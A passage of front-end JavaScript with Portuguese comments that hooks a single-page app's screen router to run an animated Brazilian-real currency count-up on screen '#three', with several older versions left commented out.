  if (window.showScreen && typeof window.showScreen === "function") {
    const originalShowScreen = window.showScreen;
    window.showScreen = function (id, push) {
      originalShowScreen(id, push);
      if (String(id) === "three") {
        // pequeno timeout para dar tempo ao DOM ser mostrado/estilos aplicados
        setTimeout(onShowThree, 30);
      }
    };
  } else {
    // fallback: quando DOMContentLoaded e se já estiver em #three, executa
    document.addEventListener("DOMContentLoaded", () => {
      if (location.hash.replace("#", "") === "three") {
        setTimeout(onShowThree, 30);
      }
    });
  }

  // também expõe manualmente para caso queira disparar por console:
  window.__spa_helpers = window.__spa_helpers || {};
  window.__spa_helpers.onShowThree = onShowThree;
})();

// DESABILITADO: Agora usamos a função unificada animateCurrencyCounter
// que é chamada diretamente no showScreen do router principal
/*
// === Count-up robusto para #three (usa data-amount-target) ===
(function () {
  // evita múltiplas execuções
  let threeAnimated = false;

  function formatBRL(value) {
    return value.toLocaleString("pt-BR", {
      style: "currency",
      currency: "BRL",
    });
  }

  function animateCountUp(el, target, duration = 1400) {
    if (!el) return;
    const start = performance.now();
    const from = 0;
    function step(now) {
      const t = Math.min(1, (now - start) / duration);
      const eased = 1 - (1 - t) * (1 - t); // easeOutQuad
      const current = from + (target - from) * eased;
      el.textContent = formatBRL(current);
      if (t < 1) requestAnimationFrame(step);
      else el.textContent = formatBRL(target);
    }
    requestAnimationFrame(step);
  }

  function startCountUpThree() {
    // se já animou e você não quer repetir, pare aqui
    if (threeAnimated) return;
    const el = document.querySelector("#three [data-amount-target]");
    if (!el) return;
    const raw = el.getAttribute("data-amount-target");
    const target = parseFloat(raw);
    if (isNaN(target)) return;
    // mostra zero imediatamente e anima
    el.textContent = formatBRL(0);
    // pequeno timeout para garantir estilos aplicados / repaint
    setTimeout(() => animateCountUp(el, target, 1400), 30);
    threeAnimated = true;
  }

  // 1) Hook no showScreen (se existir)
  if (window.showScreen && typeof window.showScreen === "function") {
    const orig = window.showScreen;
    window.showScreen = function (id, push) {
      orig(id, push);
      if (String(id) === "three") {
        // reseta flag se quiser re-animar cada vez -> threeAnimated = false;
        startCountUpThree();
      }
    };
  }

  // 2) MutationObserver no próprio #three para detectar classes (fallback)
  const threeEl = document.getElementById("three");
  if (threeEl) {
    const mo = new MutationObserver((records) => {
      for (const r of records) {
        if (r.type === "attributes" && r.attributeName === "class") {
          if (threeEl.classList.contains("is-active")) {
            startCountUpThree();
            break;
          }
        }
      }
    });
    mo.observe(threeEl, { attributes: true, attributeOldValue: true });
  }

  // 3) Caso já esteja ativa no carregamento (ex.: #three no hash), dispara agora
  document.addEventListener("DOMContentLoaded", () => {
    const threeNow = document.getElementById("three");
    if (threeNow && threeNow.classList.contains("is-active")) {
      // aguarda um tick para garantir render
      setTimeout(startCountUpThree, 20);
    }
  });

  // opcional: expor função para forçar re-execução via console
  window.__countup_helpers = window.__countup_helpers || {};
  window.__countup_helpers.startCountUpThree = function (force) {
    if (force) threeAnimated = false;
    startCountUpThree();
  };
})();
*/

// apaga akiiiiiiiiiiiiiiiii

/* ===== Count-up definitivo para o span em #three ===== */
(function () {
  const SEL = "#three .valor-currency-dois[data-amount-target]";

  function formatBRL(value) {
    return value.toLocaleString("pt-BR", {
      style: "currency",
      currency: "BRL",
    });
  }

  function animateCountUpEl(el, target, duration = 1400) {
    if (!el) return;
    const startVal = 0;
    const startTime = performance.now();
    function step(now) {
      const t = Math.min(1, (now - startTime) / duration);
      const eased = 1 - (1 - t) * (1 - t); // easeOutQuad
      const current = startVal + (target - startVal) * eased;
      el.textContent = formatBRL(current);
      if (t < 1) requestAnimationFrame(step);
      else el.textContent = formatBRL(target); // garante valor final exato
    }
    requestAnimationFrame(step);
  }

  function triggerCountUp() {
    const el = document.querySelector(SEL);
    if (!el) return;
    const raw = el.getAttribute("data-amount-target");
    const target = parseFloat(raw);
    if (isNaN(target)) return;
    // zera e anima
    el.textContent = formatBRL(0);
    // timeout pequeno para garantir repaint antes da animação
    setTimeout(() => animateCountUpEl(el, target, 1400), 20);
  }

  // DESABILITADO: Agora usamos a função unificada animateCurrencyCounter
  // que é chamada diretamente no showScreen do router principal
  /*
  // 1) Hook no showScreen (se existir) — re-anima sempre que for para #three
  if (window.showScreen && typeof window.showScreen === "function") {
    const orig = window.showScreen;
    window.showScreen = function (id, push) {
      orig(id, push);
      if (String(id) === "three") {
        // força re-animação a cada entrada
        triggerCountUp();
      }
    };
  }

  // 2) MutationObserver no próprio #three (fallback para outros fluxos)
  const threeEl = document.getElementById("three");
  if (threeEl) {
    const mo = new MutationObserver((records) => {
      for (const r of records) {
        if (r.type === "attributes" && r.attributeName === "class") {
          if (threeEl.classList.contains("is-active")) triggerCountUp();
        }
      }
    });
    mo.observe(threeEl, { attributes: true });
  }
  */

  // 3) Se já estiver ativa no carregamento (ex.: hash = #three), dispara agora
  document.addEventListener("DOMContentLoaded", () => {
    const threeNow = document.getElementById("three");
    if (threeNow && threeNow.classList.contains("is-active")) {
      setTimeout(triggerCountUp, 20);
    }
  });

  // expõe helper para testar no console: window.__countup.trigger(true)
  window.__countup = window.__countup || {};
  window.__countup.trigger = function (force) {
    if (force) {
      // força zerar e re-rodar
      const el = document.querySelector(SEL);
      if (el) el.textContent = formatBRL(0);
    }
    triggerCountUp();
  };
})();

// apaga abaixo

document.addEventListener("DOMContentLoaded", function () {
  // Garante que o SPA já inicializou o router
  setTimeout(() => {
    if (window.showScreen) {
      const originalShowScreen = window.showScreen;

      window.showScreen = function (id, push) {
        originalShowScreen(id, push);

        if (id === "three") {
          setTimeout(() => {
            if (window.__spa_helpers && window.__spa_helpers.onShowThree) {
              window.__spa_helpers.onShowThree();
            }
          }, 30);
        }
      };
    }
  }, 100);
});
